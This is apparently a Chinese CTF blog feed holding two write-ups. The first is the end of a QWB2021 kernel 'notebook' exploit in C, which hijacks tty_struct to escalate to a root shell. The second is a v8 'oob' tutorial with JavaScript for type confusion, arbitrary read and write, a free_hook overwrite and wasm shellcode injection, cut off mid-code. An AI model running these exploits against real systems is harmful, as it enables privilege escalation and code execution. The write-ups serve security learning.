return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void* add_thread(int idx)</span><br><span class="line">&#123;</span><br><span class="line">	puts(&quot;[+] add thread start!&quot;);</span><br><span class="line">	noteadd(idx, 0x60, stuck_mapped_memory);</span><br><span class="line">	puts(&quot;[+] add thread end!&quot;); // won&#x27;t reach here</span><br><span class="line">	return NULL;</span><br><span class="line">&#125;</span><br><span class="line">char buf_a[0x500] = &#123;&quot;aaa&quot;&#125;;</span><br><span class="line">size_t buf_tty[0x100], buf_fake_table[0x500];</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int pid,tty_fd;</span><br><span class="line">    stuck_mapped_memory = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);</span><br><span class="line">    RegisterUserfault(stuck_mapped_memory,userfault_stuck_handler);</span><br><span class="line">    note_fd = open(&quot;/dev/notebook&quot;, O_RDWR);</span><br><span class="line">	if (note_fd &lt; 0)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrExit(&quot;[-] err in open notebook device&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">    noteadd(0,0x60,buf_a);</span><br><span class="line">    noteadd(1,0x60,buf_a);</span><br><span class="line">    noteedit(0,TTY_STRUCT_SZIE,buf_a);</span><br><span class="line">    noteedit(1,0x500,buf_a);</span><br><span class="line">    pthread_t thr_edit, thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit,NULL,edit_thread,0);</span><br><span class="line">    sleep(1);</span><br><span class="line">    pthread_create(&amp;thr_add,NULL,add_thread,0);</span><br><span class="line">    sleep(1);</span><br><span class="line">    puts(&quot;[+] ready to open ptmx&quot;);</span><br><span class="line">    for (int i = 0; i &lt; 20; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		tty_fd = open(&quot;/dev/ptmx&quot;, O_RDWR);</span><br><span class="line">		if (tty_fd &lt; 0)</span><br><span class="line">		&#123;</span><br><span class="line">			ErrExit(&quot;[-] ptmx open failed!&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		read(note_fd, buf_tty, 0);</span><br><span class="line">		if (buf_tty[0] == 0x100005401)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;[+] tty_struct found! fd = %d\n&quot;, tty_fd);</span><br><span class="line">			break; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if (buf_tty[0] != 0x100005401)</span><br><span class="line">	&#123;</span><br><span class="line">		ErrExit(&quot;[-] leak failed&quot;);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    size_t ptm_unix98_ops_addr = buf_tty[3];</span><br><span class="line">    if ((ptm_unix98_ops_addr &amp; 0xFFF) == 0x320) ptm_unix98_ops_addr += 0x120;</span><br><span class="line">    size_t work_for_cpu_fn_addr =  work_for_cpu_fn_off + ptm_unix98_ops_addr;</span><br><span class="line">    size_t tty_struct_addr = buf_tty[10] - 0x50;</span><br><span class="line">    size_t commit_creds_addr = commit_creds_off + ptm_unix98_ops_addr;</span><br><span class="line">    size_t prepare_kernel_cred_addr = prepare_kernel_cred_off + ptm_unix98_ops_addr;</span><br><span class="line">    size_t kernel_base = prepare_kernel_cred_addr - 0xA9EF0;</span><br><span class="line"></span><br><span class="line">    printf(&quot;[+] ptm_unix98_ops addr leaked, addr: 0x%lx\n&quot;, ptm_unix98_ops_addr);</span><br><span class="line">    printf(&quot;[+] work_for_cpu_fn addr leaked, addr: 0x%lx\n&quot;, work_for_cpu_fn_addr);</span><br><span class="line">    printf(&quot;[+] prepare_kernel_cred addr leaked, addr: 0x%lx\n&quot;, prepare_kernel_cred_addr);</span><br><span class="line">    printf(&quot;[+] tty_struct addr leaked, addr: 0x%lx\n&quot;, tty_struct_addr);</span><br><span class="line"></span><br><span class="line">    size_t gift[100];</span><br><span class="line">    notegift(gift);</span><br><span class="line">    size_t note0_addr = gift[0*2];</span><br><span class="line">    size_t note1_addr = gift[1*2];</span><br><span class="line">    assert(note0_addr == tty_struct_addr);</span><br><span class="line">    printf(&quot;[+] note1 addr leaked, addr: 0x%lx\n&quot;, note1_addr);</span><br><span class="line"></span><br><span class="line">    buf_tty[0] = 0x100005401;</span><br><span class="line">	buf_tty[3] = note1_addr;</span><br><span class="line">	buf_tty[4] = prepare_kernel_cred_addr;</span><br><span class="line">	buf_tty[5] = 0;</span><br><span class="line">	write(note_fd, buf_tty, 0); </span><br><span class="line"></span><br><span class="line">	buf_fake_table[7] = work_for_cpu_fn_addr;</span><br><span class="line">	buf_fake_table[10] = work_for_cpu_fn_addr;</span><br><span class="line">	buf_fake_table[12] = work_for_cpu_fn_addr;</span><br><span class="line">	write(note_fd, buf_fake_table, 1);</span><br><span class="line"></span><br><span class="line">	ioctl(tty_fd, 233, 233);</span><br><span class="line"></span><br><span class="line">	read(note_fd, buf_tty, 0);</span><br><span class="line">	printf(&quot;[+] prepare_kernel_cred finished, return 0x%lx\n&quot;, buf_tty[6]);</span><br><span class="line"></span><br><span class="line">	buf_tty[0] = 0x100005401;</span><br><span class="line">	buf_tty[3] = note1_addr;</span><br><span class="line">	buf_tty[4] = commit_creds_addr;</span><br><span class="line">	buf_tty[5] = buf_tty[6];</span><br><span class="line">	write(note_fd, buf_tty, 0);</span><br><span class="line">	sleep(1);</span><br><span class="line"></span><br><span class="line">	ioctl(tty_fd, 233, 233);</span><br><span class="line"></span><br><span class="line">	if (getuid() == 0)</span><br><span class="line">	&#123;</span><br><span class="line">		puts(&quot;[+] root now!&quot;);</span><br><span class="line">		system(&quot;/bin/sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">        puts(&quot;[-] root failed&quot;);</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/qwb2021-notebook/win.jpg" class="">

<h2 id="一点总结"><a href="#一点总结" class="headerlink" title="一点总结"></a>一点总结</h2><p>1、内核pwn和常规的pwn其实本质一样，只不过非常复杂<br>2、碰到新问题不一定要照着前人的方法来套，分析目标最重要，在遇到新的内核问题时找不到思路，看内核源码还是有用的</p>
<p>参考链接：<br><a href="https://zhuanlan.zhihu.com/p/385645268">长亭科技-强网杯2021冠军队wp</a><br><a href="https://www.cjovi.icu/WP/1468.html">QWB2021-notebook-WP</a><br><a href="https://blog.csdn.net/lukuen/article/details/6935068">linux 内核堆管理机制</a><br><a href="https://paper.seebug.org/1153/">Linux 内核内存管理与漏洞利用</a></p>
]]></content>
      <categories>
        <category>linux内核pwn</category>
      </categories>
      <tags>
        <tag>linux内核pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>浏览器pwn学习——v8-oob</title>
    <url>/v8-oob/</url>
    <content><![CDATA[<p>我的第一个v8漏洞</p>
<span id="more"></span>
<h1 id="CTF-OOB"><a href="#CTF-OOB" class="headerlink" title="*CTF OOB"></a>*CTF OOB</h1><h2 id="题目介绍"><a href="#题目介绍" class="headerlink" title="题目介绍"></a>题目介绍</h2><p>来自*CTF的v8 pwn题，漏洞点比较简单，利用起来也不是很复杂，比较适合作为v8的入门</p>
<h2 id="题目环境搭建"><a href="#题目环境搭建" class="headerlink" title="题目环境搭建"></a>题目环境搭建</h2><p>v8是由google开发的java script引擎。由于特殊条件的限制，我们如果想要对它进行分析研究，就需要使用一些科学手段。科学手段操作方法这里不多讲了，参见下面的链接。<br><a href="https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html">https://mem2019.github.io/jekyll/update/2019/07/18/V8-Env-Config.html</a><br>配置完后，调整到对应v8版本并应用题目给的patch。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">gclient <span class="built_in">sync</span></span><br><span class="line">git apply ../oob.diff</span><br><span class="line"></span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release</span><br><span class="line"></span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug</span><br></pre></td></tr></table></figure>
<p>其中debug版本中存在检查，触发本题的漏洞时会做检查然后直接崩溃，这里编译出来只是为了看v8的一些内存结构，漏洞触发和调试均放在release版本上。</p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="v8对象结构"><a href="#v8对象结构" class="headerlink" title="v8对象结构"></a>v8对象结构</h3><p>js作为一个面向对象的语言，它的变量都是用类表示的。并且由于js是一个动态语言，它的类的成员是可以变得，这就导致它类的内存结构和C那些不太一样，复杂很多。<br>v8下类的派生结构图：</p>
<img src="/v8-oob/paishen.webp" class="">
<p>在v8里，js类的一般结构如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[ class / map ] -&gt; ... ; 指向内部类或者数组对象的map对象</span><br><span class="line">[ properties  ] -&gt; [empty array]</span><br><span class="line">[ elements    ] -&gt; [empty array] ; 数值类型名称的属性</span><br><span class="line">[ reserved #1 ] -\</span><br><span class="line">[ reserved #2 ]  |</span><br><span class="line">[ reserved #3 ]  &#125;- in object properties,即预分配的内存空间</span><br><span class="line">...............  |</span><br><span class="line">[ reserved #N ] -/</span><br></pre></td></tr></table></figure>
<p>我们来用debug版的v8看看实际情况下是个什么情况<br>写一个测试用的js</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
<p>以arraybuffer为例<br>arraybuffer的结构：</p>
<img src="/v8-oob/arraybuffer.PNG" class="">
<p>gdb看的内存：</p>
<img src="/v8-oob/neicun.PNG" class="">
<p>注意那个地址的最后，它的值看起来不是对齐的。这是因为v8里有个tagged pointer机制，一个地址指向的如果不是SMI（就是小整数)，它的最低位就会打上一个标记，就会有个1，看起来就不是对齐的，用的时候要减1。</p>
<p>在v8的类结构里面，和本题关系比较大的是map这个元素。这个元素简单来说就是v8用来指示这个对象里的数据如何被解析的。要注意的是v8解析对象类型靠的就是它，也就是说如果你能改变它，你就能让v8错误地解析一个对象。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>题目提供了一个patch文件，给我们造了个漏洞：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">diff --git a/src/bootstrapper.cc b/src/bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f <span class="number">100644</span></span><br><span class="line">--- a/src/bootstrapper.cc</span><br><span class="line">+++ b/src/bootstrapper.cc</span><br><span class="line">@@ <span class="number">-1668</span>,<span class="number">6</span> +<span class="number">1668</span>,<span class="number">8</span> @@ <span class="type">void</span> <span class="title function_">Genesis::InitializeGlobal</span><span class="params">(Handle&lt;JSGlobalObject&gt; global_object,</span></span><br><span class="line"><span class="params">                           Builtins::kArrayPrototypeCopyWithin, <span class="number">2</span>, <span class="literal">false</span>)</span>;</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;fill&quot;</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, <span class="string">&quot;oob&quot;</span>,</span><br><span class="line">+                          Builtins::kArrayOob,<span class="number">2</span>,<span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;find&quot;</span>,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, <span class="string">&quot;findIndex&quot;</span>,</span><br><span class="line">diff --git a/src/builtins/builtins-<span class="built_in">array</span>.cc b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">index <span class="number">8</span>df340e.<span class="number">.9</span>b828ab <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">+++ b/src/builtins/builtins-<span class="built_in">array</span>.cc</span><br><span class="line">@@ <span class="number">-361</span>,<span class="number">6</span> +<span class="number">361</span>,<span class="number">27</span> @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   <span class="keyword">return</span> *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  <span class="comment">// namespace</span></span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    <span class="type">uint32_t</span> len = args.length();</span><br><span class="line">+    <span class="keyword">if</span>(len &gt; <span class="number">2</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; <span class="built_in">array</span> = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements = FixedDoubleArray::cast(<span class="built_in">array</span>-&gt;elements());</span><br><span class="line">+    <span class="type">uint32_t</span> length = static_cast&lt;<span class="type">uint32_t</span>&gt;(<span class="built_in">array</span>-&gt;length()-&gt;Number());</span><br><span class="line">+    <span class="keyword">if</span>(len == <span class="number">1</span>)&#123;</span><br><span class="line">+        <span class="comment">//read</span></span><br><span class="line">+        <span class="keyword">return</span> *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">+        <span class="comment">//write</span></span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(<span class="number">1</span>)));</span><br><span class="line">+        elements.<span class="built_in">set</span>(length,value-&gt;Number());</span><br><span class="line">+        <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index <span class="number">0447230.</span>.f113a81 <span class="number">100644</span></span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ <span class="number">-368</span>,<span class="number">6</span> +<span class="number">368</span>,<span class="number">7</span> @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   <span class="comment">/* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */</span>   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   <span class="comment">/* ArrayBuffer */</span>                                                            \</span><br><span class="line">   <span class="comment">/* ES #sec-arraybuffer-constructor */</span>                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index ed1e4a5..c199e3a <span class="number">100644</span></span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ <span class="number">-1680</span>,<span class="number">6</span> +<span class="number">1680</span>,<span class="number">8</span> @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       <span class="keyword">return</span> Type::Receiver();</span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayUnshift:</span><br><span class="line">       <span class="keyword">return</span> t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    <span class="keyword">case</span> Builtins::kArrayOob:</span><br><span class="line">+      <span class="keyword">return</span> Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     <span class="comment">// ArrayBuffer functions.</span></span><br><span class="line">     <span class="keyword">case</span> Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure>
<p>重点关注builtins-array.cc里面的改动，另外两个文件的改动只是为了让它正常工作。</p>
<p>这一段改动主要给array对象造了这么一个oob方法，功能为：<br>1、当参数只有一个（即我们在调用的时候什么也不传，因为所有方法都会有个this指针作为默认参数），就返回数组最后一个元素之后的元素<br>2、当参数有两个（即我们在调用的时候传一个参数），就用我们传入的参数覆盖数组最后一个元素之后的元素<br>3、其他情况下返回一个undefined</p>
<p>那么它返回和覆盖的究竟是个什么呢<br>我们用gdb调试看看</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
<img src="/v8-oob/jsarray.PNG" class="">
<p>箭头指向的是数组数据真正存放的地方，我们看看这片区域里有啥</p>
<img src="/v8-oob/mem1.PNG" class="">
<p>开头是的0x10是指向properties的指针和数组信息位，然后是数组的是个元素，然后在元素的后面，就是红圈圈着的那个，是指向数组对象map对象的指针。也就是说，这个oob方法能返回给我们数组对象的map，还能让我们修改它。</p>
<p>前面说过，map是v8用来判断对象类别的，我们能修改它，就能引起v8的类别混淆。这有什么用呢？我们用另外一个数组来说明</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> obj1 = &#123;<span class="string">&#x27;a&#x27;</span>:<span class="number">1.1</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> obj2 = &#123;<span class="string">&#x27;b&#x27;</span>:<span class="number">2.2</span>&#125;;</span><br><span class="line"><span class="keyword">let</span> a = [obj1,obj2];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>
<img src="/v8-oob/mem2.PNG" class="" title="avatar">

<img src="/v8-oob/mem3.PNG" class="" title="avatar">
<p>可以看到这个用对象当元素的数组在结构上和前面那个浮点数组其实差不多，看内存，存储的都是一串浮点数，区别在于其解析方式。那么如果我们把浮点数组的map改成对象数组的，我们就能在浮点数组的元素所指向的地方伪造一个对象，反过来我们就能得到一个对象的地址，这就是类型混淆所能带来的功效。</p>
<p>按照上面的分析，我们来编写利用。首先是实现利用类型混淆来伪造对象和读取对象地址。</p>
<p>先写个类型转换方便后面利用，v8存储都是用浮点数（除了小整形），不能直接读，我们也不能直接写，要用函数转换。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function hex(i)</span><br><span class="line">&#123;</span><br><span class="line">    return &#x27;0x&#x27;+i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">&#125;</span><br><span class="line">const MAX_ITERATIONS = 10000;</span><br><span class="line">class Memory&#123;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">        this.buf = new ArrayBuffer(8);</span><br><span class="line">        this.f64 = new Float64Array(this.buf);</span><br><span class="line">        this.u32 = new Uint32Array(this.buf);</span><br><span class="line">        this.bytes = new Uint8Array(this.buf);</span><br><span class="line">    &#125;</span><br><span class="line">    f2i(val)&#123;</span><br><span class="line">        this.f64[0] = val;</span><br><span class="line">        let tmp = Array.from(this.u32);</span><br><span class="line">        return tmp[1] * 0x100000000 + tmp[0];</span><br><span class="line">    &#125;</span><br><span class="line">    i2f(val)&#123;</span><br><span class="line">        let tmp = [];</span><br><span class="line">        tmp[0] = parseInt(val % 0x100000000);</span><br><span class="line">        tmp[1] = parseInt((val - tmp[0]) / 0x100000000);</span><br><span class="line">        this.u32.set(tmp);</span><br><span class="line">        return this.f64[0];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">let mem = new Memory();</span><br></pre></td></tr></table></figure>
<p>然后是类型混淆的部分</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let float_array = [1.1,2.2,3.3,4.4];</span><br><span class="line">let obj = &#123;&#x27;a&#x27;:1.1&#125;;</span><br><span class="line">let obj_array = [obj];</span><br><span class="line">let float_map = float_array.oob()</span><br><span class="line">let obj_map = obj_array.oob();</span><br><span class="line">let maxSize = 1028 * 8;</span><br><span class="line">function addrof(obj)</span><br><span class="line">&#123;</span><br><span class="line">  obj_array[0] = obj;</span><br><span class="line">  obj_array.oob(float_map);</span><br><span class="line">  let addr = mem.f2i(obj_array[0])</span><br><span class="line">  obj_array.oob(obj_map);</span><br><span class="line">  return addr;</span><br><span class="line">&#125;</span><br><span class="line">function fakeobj(addr)</span><br><span class="line">&#123;</span><br><span class="line">  float_array[0] = mem.i2f(addr);</span><br><span class="line">  float_array.oob(obj_map);</span><br><span class="line">  let fake = float_array[0];</span><br><span class="line">  float_array.oob(float_map);</span><br><span class="line">  return fake;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就是照上面的思路，用修改map指针的方式来实现读取对象的地址和伪造对象。有了这两个功能还不够，我们要做v8的漏洞利用一般都需要搞出来任意地址读写。</p>
<p>任意地址写照上面的思路好写，伪造对象修改对象属性即可。那任意地址读怎么办呢</p>
<p>我们可以使用伪造结构的方式，来伪造出一个浮点数组来。如果我们在一个长度为4的浮点数组元素区上方0x20位置伪造一个对象，那么这个数组的第一个元素就是map指针，第三个元素就是这个伪造对象的元素区指针，把它改成我们想要的目标就能读取目标地址处的值了。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arb_Buffer = [float_map,<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbRead</span>(<span class="params">addr</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (addr % <span class="number">2</span> == <span class="number">0</span>) </span><br><span class="line">  &#123;</span><br><span class="line">    addr += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> <span class="variable constant_">OBJ</span> = <span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(arb_Buffer)-<span class="number">0x20</span>);</span><br><span class="line">  arb_Buffer[<span class="number">2</span>] = mem.<span class="title function_">i2f</span>(addr - <span class="number">0x10</span>);</span><br><span class="line">  <span class="keyword">let</span> result = mem.<span class="title function_">f2i</span>(<span class="variable constant_">OBJ</span>[<span class="number">0</span>]);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*]value at &quot;</span>+<span class="title function_">hex</span>(addr)+<span class="string">&quot; is &quot;</span>+<span class="title function_">hex</span>(result));</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而任意地址读一开始想法如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">backstoreWrite</span>(<span class="params">addr,value</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> <span class="variable constant_">OBJ</span> = <span class="title function_">fakeobj</span>(<span class="title function_">addrof</span>(arb_Buffer)-<span class="number">0x20</span>);</span><br><span class="line">  arb_Buffer[<span class="number">2</span>] = mem.<span class="title function_">i2f</span>(addr - <span class="number">0x10</span>);</span><br><span class="line">  <span class="variable constant_">OBJ</span>[<span class="number">0</span>] = mem.<span class="title function_">i2f</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但这样在写某些地址时会报错，具体原因我也不知道，应该和map指针的其他机制有关。于是以这个函数为基础，又使用dataview和arraybuffer的backingstore来实现了另一个任意地址写（backingstore类似于数组的element，在v8中也是任意地址写的常用方法）</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">arbWrite</span>(<span class="params">addr,value</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line">  <span class="keyword">let</span> backingsotre = <span class="title function_">addrof</span>(buf)+<span class="number">0x20</span>;</span><br><span class="line">  <span class="title function_">backstoreWrite</span>(backingsotre,addr);</span><br><span class="line">  view.<span class="title function_">setBigInt64</span>(<span class="number">0</span>,<span class="title class_">BigInt</span>(value),<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>有了任意地址读写，就能开始利用了</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="比较简单的，修改free-hook的方法"><a href="#比较简单的，修改free-hook的方法" class="headerlink" title="比较简单的，修改free_hook的方法"></a>比较简单的，修改free_hook的方法</h3><p>一般来说我们做pwn，要控制指令流方法就这么几个。这一题我们可以改freehook，也能rop。这里将比较简单的覆盖free_hook的方法<br>首先，我们需要libc基址。在做别的题的时候，我曾经见过一个通过大量释放堆块，然后在堆块中搜索mainarena地址来得到libc基址的方法。但由于v8的垃圾回收基址，这方法不确定性比较大，而且费时间。于是我就想有没有稳定的方法，然后找到了下面这个方法</p>
<p>这个方法是利用v8浮点数组对象的一个特性，简单来说就是里面存在一条链：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array-&gt;array.constructor+0x30-&gt;addr of codes </span><br></pre></td></tr></table></figure>
<p>在数组的constructor对象地址偏移0x30的地方，稳定存放着和数组初始化有关的v8引擎代码的地址。通过这个地址，我们能得到程序的基址，算出got表地址，通过读取got表我们就能得到libc中函数的地址，从而算出libc基址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let test = [1.1,2.2,3.3,4.4];</span><br><span class="line">let code_addr = arbRead(addrof(test.constructor)+0x30);</span><br><span class="line">let elf_base = arbRead(code_addr+0x41)-0xad54e0;</span><br><span class="line">let fprintf_got = 0xd9a3a0+elf_base;</span><br><span class="line">let libcbase = arbRead(fprintf_got) - 0x64eb0;</span><br><span class="line">console.log(&quot;[*]libcbase ==&gt; &quot;+hex(libcbase));</span><br></pre></td></tr></table></figure>
<p>然后我们把free_hook盖成system（盖成onegadget没有什么意义，不如system执行一些命令），再随便释放一个带有指令的堆块，使用console.log就能做到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let systemaddr = libcbase + 0x000000000004F550;</span><br><span class="line">let freehook = libcbase + 0x3ed8e8;</span><br><span class="line">arbWrite(freehook,systemaddr);</span><br><span class="line">//%SystemBreak();</span><br><span class="line">console.log(&#x27;xcalc&#x27;);</span><br></pre></td></tr></table></figure>
<img src="/v8-oob/result1.PNG" class="">

<p>这个方法虽然简单，但它有几个问题<br>1、弹完计算器之后它还会free别的很多堆块，你不能保证free的时候freehook不会导致什么问题，而且控制台会一直弹字符，比较难看。<br>2、在现实情况下，v8是开了沙箱的，我们达到命令执行之后通常还得做逃逸，如果是直接盖free_hook会导致后面逃逸的部分不好搞</p>
<p>基于这两个问题，一般情况下我们选择第二种方法来利用</p>
<h3 id="写入shellcode"><a href="#写入shellcode" class="headerlink" title="写入shellcode"></a>写入shellcode</h3><p>如果能执行shellcode，那我们可以做的事情就比只用system多一点。<br>写入shellcode的思路大体上就是开一块RWX的区域，然后往里写shellcode执行。这里我们使用webasm的方法来执行。老版本好像还有直接改JIT优化的代码区这种操作，但现在不行，本题中也不涉及JIT。</p>
<p>v8提供WebAssembly这种对象让我们能写wasm来产生一个函数。但是这个对象在生成底层代码的时候是会检查的，会阻止你传入那些系统函数，于是就需要我们在它生成完底层代码之后往它开的RWX页里写我们自己的shellcode，注意这里的shellcode要用wasm写。<br>利用代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);</span><br><span class="line">let wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">let wasm_instance = new WebAssembly.Instance(wasm_mod);</span><br><span class="line">let f = wasm_instance.exports.main;</span><br><span class="line"> </span><br><span class="line">let rwx_page_addr = arbRead(addrof(wasm_instance)-1+0x88);</span><br><span class="line"> </span><br><span class="line">console.log(&quot;[+]RWX Wasm page addr: &quot; + hex(rwx_page_addr));</span><br><span class="line"> </span><br><span class="line">function copy_shellcode(addr, shellcode) </span><br><span class="line">&#123;</span><br><span class="line">    let buf = new ArrayBuffer(0x100);</span><br><span class="line">    let dataview = new DataView(buf);</span><br><span class="line">    let buf_addr = addrof(buf);</span><br><span class="line">    let backing_store_addr = buf_addr + 0x20;</span><br><span class="line">    backstoreWrite(backing_store_addr, addr);</span><br><span class="line"> </span><br><span class="line">    for (let i = 0; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">    dataview.setUint32(4*i, 